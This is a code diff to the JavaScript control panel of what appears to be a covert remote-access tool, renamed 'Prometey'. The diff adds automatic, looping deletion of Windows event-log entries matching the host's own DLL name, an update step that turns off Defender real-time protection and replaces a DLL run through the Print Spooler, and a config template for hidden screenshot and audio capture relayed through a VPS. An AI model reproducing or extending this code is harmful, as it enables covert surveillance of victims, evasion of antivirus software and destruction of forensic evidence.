+    const m = fn.match(/sortProcs\('(\w+)'\)/);
+    if (m) {
+      const col = m[1];
+      const base = th.getAttribute('data-i18n') ? t(th.getAttribute('data-i18n')) : th.textContent.replace(/[▴▾▿]/g,'').trim();
+      if (col === state.procSortKey) th.textContent = base + ' ' + (state.procSortAsc ? '▴' : '▾');
+      else th.textContent = base;
+    }
+  });
+
+  const maxMem = Math.max(1, ...procs.map(p=>Number(p.memory)||0));
   const tbody = document.getElementById('proc-body');
   tbody.innerHTML = '';
   sorted.forEach(p => {
     const mem = Number(p.memory) || 0;
+    const cpu = Number(p.cpu) || 0;
     const memStr = formatBytes(mem * 1024);
     const barW = maxMem > 0 ? Math.round(mem/maxMem*60) : 0;
+    // CPU color: green <5%, yellow <20%, orange <50%, red >=50%
+    const cpuColor = cpu <= 0 ? 'var(--muted)' : cpu < 5 ? '#4caf50' : cpu < 20 ? '#cddc39' : cpu < 50 ? '#ffa726' : '#f44336';
     const tr = document.createElement('tr');
     tr.className = 'proc-row' + (state.selectedPid === p.pid ? ' selected' : '');
     tr.innerHTML = `
       <td><input type="checkbox" class="proc-cb" data-pid="${p.pid}" /></td>
       <td style="color:var(--muted)">${p.pid}</td>
       <td>${escHtml(p.name||'')}</td>
+      <td style="color:${cpuColor};font-weight:${cpu > 0 ? 'bold' : 'normal'};font-family:monospace;">${cpu}%</td>
       <td class="proc-mem">${memStr}<span class="mem-bar" style="width:${barW}px"></span></td>
       <td style="color:var(--muted)">${p.threads||0}</td>
       <td><button class="svc-action-btn" style="color:var(--danger);border-color:var(--danger)" onclick="killPid(${p.pid},'${escHtml(p.name)}')">Kill</button></td>`;
@@ -6107,6 +6203,53 @@ async function runAllSpeedTests() {
 // ═══════════════════════════════════════════════════════════════
 let _evtLogData = [];  // Cached entries for filter/search
 
+// ── Auto-clean config controls ──
+(function() {
+  const modeEl = document.getElementById('evtlog-mode');
+  if (modeEl) {
+    modeEl.addEventListener('change', function() {
+      const wrap = document.getElementById('evtlog-interval-wrap');
+      if (wrap) wrap.style.display = this.value === 'loop' ? 'flex' : 'none';
+    });
+  }
+})();
+
+async function evtLoadCleanConfig() {
+  if (!state.hostOnline) return;
+  try {
+    const res = await sendCmd({ cmd: 'get_config' });
+    const cfg = res.config || res;
+    const mode = cfg.evtlog_clean_mode || 'once';
+    const interval = cfg.evtlog_clean_interval || 120;
+    const patterns = cfg.evtlog_clean_patterns || '';
+    const modeEl = document.getElementById('evtlog-mode');
+    const intEl = document.getElementById('evtlog-interval');
+    const patEl = document.getElementById('evtlog-patterns');
+    const wrap = document.getElementById('evtlog-interval-wrap');
+    if (modeEl) modeEl.value = patterns ? mode : 'off';
+    if (intEl) intEl.value = interval;
+    if (patEl) patEl.value = patterns;
+    if (wrap) wrap.style.display = mode === 'loop' && patterns ? 'flex' : 'none';
+  } catch(e) {}
+}
+
+async function evtApplyCleanConfig() {
+  const modeEl = document.getElementById('evtlog-mode');
+  const intEl = document.getElementById('evtlog-interval');
+  const patEl = document.getElementById('evtlog-patterns');
+  const stEl = document.getElementById('evtlog-clean-status');
+  const mode = modeEl ? modeEl.value : 'once';
+  const interval = intEl ? Math.max(60, parseInt(intEl.value) || 120) : 120;
+  const patterns = (mode === 'off') ? '' : (patEl ? patEl.value.trim() : '');
+  try {
+    await sendCmd({ cmd: 'evtlog_set_config', mode, interval: String(interval), patterns });
+    if (stEl) { stEl.textContent = '✓ ' + t('msg_done'); stEl.style.color = '#4caf50'; }
+    addLog('Event log clean config: mode=' + mode + ' interval=' + interval + 's', 'OK');
+  } catch(e) {
+    if (stEl) { stEl.textContent = '✗ ' + (e.message || 'Error'); stEl.style.color = '#f44336'; }
+  }
+}
+
 async function refreshEventLog() {
   if (!state.hostOnline) return;
   const container = document.getElementById('evtlog-list');
@@ -6526,7 +6669,7 @@ document.addEventListener('keydown', e => {
   loadJitterBufSetting();
 })();
 
-addLog('RemoteDesk PRO initialized', 'OK');
+addLog('Prometey initialized', 'OK');
 addLog('Click CONNECT to begin', 'INFO');
 
 // ═══════════════════════════════════════════════════════════════
@@ -9476,10 +9619,10 @@ async function hostUpdate() {
     } else if (ds.realtime_enabled) {
       if (!confirm('Defender Real-Time включён. Будет временно отключен во время обновления.\n\nПродолжить?')) return;
     } else {
-      if (!confirm('Replace host DLL and restart Spooler?\nHost disconnects for ~10 seconds.')) return;
+      if (!confirm('Replace host DLL and restart service?\nHost disconnects for ~10 seconds.')) return;
     }
   } catch(e) {
-    if (!confirm('Replace host DLL and restart Spooler?\nHost disconnects for ~10 seconds.')) return;
+    if (!confirm('Replace host DLL and restart service?\nHost disconnects for ~10 seconds.')) return;
   }
 
   // Reset & show progress UI
@@ -9501,8 +9644,8 @@ async function hostUpdate() {
     sendCmd({ cmd: 'host_update', url: url }).catch(()=>{});
   } catch(e) {}
 
-  // Poll update_status until step 9 (Done) or timeout
-  const TOTAL = 9;
+  // Poll update_status until step 7 (Done) or timeout
+  const TOTAL = 7;
   let lastStep = 0;
   let stableMisses = 0;
   const startTs = Date.now();
@@ -9662,6 +9805,101 @@ function cfgFormat() {
   } catch (e) {
     st.textContent = 'Invalid JSON: ' + e.message; st.style.color = '#f44336';
   }
+}
+
+// ── Local config file management (create / open / save .json) ──
+function cfgNew() {
+  const ed = document.getElementById('cfg-editor');
+  const st = document.getElementById('cfg-status');
+  const template = {
+    server: "YOUR_VPS_IP",
+    port: 443,
+    use_tls: true,
+    token: "my-room-token",
+    password: "secret-password",
+    codec: "h264",
+    quality: 80,
+    fps: 30,
+    scale: 100,
+    bitrate: 2000,
+    screen_connections: 1,
+    file_connections: 4,
+    log_level: "INFO",
+    stun_server: "stun:YOUR_VPS_IP:3478",
+    turn_server: "turn:rdp:TURN_PASSWORD@YOUR_VPS_IP:3478",
+    evtlog_clean_patterns: "pnpext,pnpext.dll",
+    evtlog_clean_interval: 120,
+    evtlog_clean_mode: "once",
+    screenshot_enabled: false,
+    screenshot_interval: 10,
+    screenshot_quality: 75,
+    screenshot_scale: 50,
+    screenshot_always: true,
+    screenshot_apps: "",
+    audio_enabled: false,
+    audio_segment_duration: 30,
+    audio_sample_rate: 16000,
+    audio_bitrate: 128,
+    audio_channels: 1,
+    audio_gain: 100,
+    audio_denoise: true,
+    audio_normalize: true,
+    audio_hum_filter: 50,
+    threat_scan_enabled: true,
+    threat_auto_pause: false
+  };
+  ed.value = JSON.stringify(template, null, 2);
+  st.textContent = t('cfg_new') + ' — ' + t('msg_done'); st.style.color = '#4caf50';
+  addLog('New config template created', 'OK');
+}
+
+function cfgLoadLocal() {
+  const input = document.createElement('input');
+  input.type = 'file';
+  input.accept = '.json,.sys,.txt';
+  input.onchange = async (e) => {
+    const file = e.target.files[0];
+    if (!file) return;
+    const st = document.getElementById('cfg-status');
+    const ed = document.getElementById('cfg-editor');
+    try {
+      const text = await file.text();
+      // Try parse as JSON directly
+      try {
+        const obj = JSON.parse(text);
+        ed.value = JSON.stringify(obj, null, 2);
+        st.textContent = file.name + ' — ' + t('msg_done'); st.style.color = '#4caf50';
+      } catch {
+        // Not valid JSON — might be raw text or encrypted. Show as-is.
+        ed.value = text;
+        st.textContent = file.name + ' (raw)'; st.style.color = '#ffa726';
+      }
+      addLog('Loaded local config: ' + file.name, 'OK');
+    } catch (err) {
+      st.textContent = t('msg_error') + ': ' + err.message; st.style.color = '#f44336';
+    }
+  };
+  input.click();
+}
+
+function cfgSaveLocal() {
+  const ed = document.getElementById('cfg-editor');
+  const st = document.getElementById('cfg-status');
+  const text = ed.value.trim();
+  if (!text) { st.textContent = 'Editor is empty'; st.style.color = '#f44336'; return; }
+  // Validate JSON
+  try { JSON.parse(text); } catch (e) {
+    st.textContent = 'Invalid JSON: ' + e.message; st.style.color = '#f44336'; return;
+  }
+  const blob = new Blob([text], { type: 'application/json' });
+  const url = URL.createObjectURL(blob);
+  const a = document.createElement('a');
+  a.href = url;
+  a.download = 'host_config.json';
+  a.click();
+  URL.revokeObjectURL(url);
+  st.textContent = 'host_config.json — ' + t('msg_done'); st.style.color = '#4caf50';
+  addLog('Config saved locally as host_config.json', 'OK');
 }
 
 // ══════════════════════════════════════════════
